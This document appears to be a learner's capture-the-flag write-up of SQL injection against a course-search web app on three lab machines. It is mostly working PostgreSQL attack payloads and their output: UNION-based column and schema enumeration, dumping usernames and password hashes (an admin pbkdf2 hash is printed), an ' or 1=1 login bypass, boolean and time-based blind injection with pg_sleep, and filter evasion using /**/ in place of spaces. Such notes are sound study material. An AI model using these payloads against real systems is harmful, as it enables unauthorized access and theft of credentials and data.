# sqli

Web app has a search form that requests to the database about available courses. That functionality is vulnerable to the SQLi (`UNION`)

1. try send to the database malitious request -> `'`
database responds with error
2. add `--` -> ok
3. figure out number of colums in original request

```
' UNION SELECT NULL; -- # error
' UNION SELECT NULL, NULL; -- error
' UNION SELECT NULL, ..., NULL; -- error
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL; -- ok

or

' order by 1 ... n --
' order by 8 -- # no errors
' order by 9 -- # error
```

3.1 find which columns contain text

```
' UNION SELECT 'a', NULL, NULL, NULL, NULL, NULL, NULL, NULL --

result -> two columns contain text 2nd and 3d

' UNION SELECT NULL, 'a', 'a', NULL, NULL, NULL, NULL, NULL --

```

4. now try to figure out what kind of database runs and witch number of colums displayed  

```
' UNION SELECT NULL, NULL, TABLE_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.TABLES ; --

' UNION SELECT NULL, NULL, TABLE_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_name like '%user%'; --
```
5. in the response I've found the needed table name - `pg_user`. Now, let's try to figure out the version of DB

```
' UNION SELECT NULL, NULL, version(), NULL, NULL, NULL, NULL, NULL  ; --

PostgreSQL 13.4 (Debian 13.4-1.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit 
```
*In order to figure out the type of db I can run -> `SELECT 'foo' WHERE 1 = (SELECT 'secret')`*

6. figure out column names from the tables

```
' UNION SELECT NULL, NULL, COLUMN_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='pg_users'; --
**not worked**

' UNION SELECT NULL, NULL, COLUMN_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'auth_user' ; --
works

find -> username and password

' UNION SELECT NULL, username, password, NULL, NULL, NULL, NULL, NULL FROM auth_user --

```
---

admin:pbkdf2_sha256$260000$8x6bvhEx8XiIuhB9QRf58F$YiZaFiVO/GZV3HwIN4KMGjk83FCJ4ZxfCX7k8UbQAFg=

---

*retrieve data of two columns into one column -> concutination '||'*

```
' UNION SELECT NULL, NULL, username || ':' || password, NULL, NULL, NULL, NULL, NULL FROM auth_user --
```


7. expose value of the flag in the table main_secret
```
' UNION SELECT NULL, NULL, flag, NULL, NULL, NULL, NULL, NULL FROM main_secret ; --

86851706-0473-441d-bfd4-7bb203c02ba6
```

8. 2nd macnime

Authentication function is vulnerable to SQLi

```
username: admin
password: ' or 1=1 ; -- # password parameter is vulnerable to SQLi

FLAG:d7aff44b-df06-4054-b11c-9632f82036d9
```
9. 3d machine - use blind SQL to list the content of the secret table on the database

9.1 confirm that the parameter is vulnerable to blind SQLi

if course exists -> displays it
if course doesn't exist -> displays `Courses not found =(`
different behaiviar

```
select courses from courses_table where course like '%{user_input}%'' and 1=1 --'

payload: ' and 1=1 --
if it's true then I'll see course, if not I'll see Courses not found =(
```
9.2 time based

1. confirm that the parameter is vulnerable to SQLi
```
'+||+pg_sleep(10)-- # it works
```
2. confirm that the secret table exists in the database

```
doesn't work -> something is protecting
' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
```

let's try to replace whitespaces on `/**/`

```
and it worked
'||/**/(cASe/**/wHEn/**/(5!=6)/**/thEn/**/pg_sleep(10)/**/eLsE/**/pg_sleep(0)/**/enD)--

'/**/order/**/by/**/8--

' UNION/**/SELECT/**/NULL,NULL,version(),NULL,NULL,NULL,NULL,NULL--

' UNION/**/SELECT/**/ NULL,/**/ NULL,/**/ table_name,/**/NULL,NULL,NULL,NULL,NULL/**/from/**/information_schema.tables;--

' UNION/**/SELECT/**/ NULL,NULL,table_name,/**/NULL,NULL,NULL,NULL,NULL/**/from/**/information_schema.tables/**/where/**/table_name/**/like/**/'%secret%';--
```
works with and without `;`

to list the flag
```
' UNION/**/SELECT/**/ NULL,NULL,table_name,/**/NULL,NULL,NULL,NULL,NULL/**/from/**/information_schema.tables/**/where/**/table_name/**/like/**/'%secret%';--

2f01ef96-e8d7-4649-879d-d5182060196f
``` 

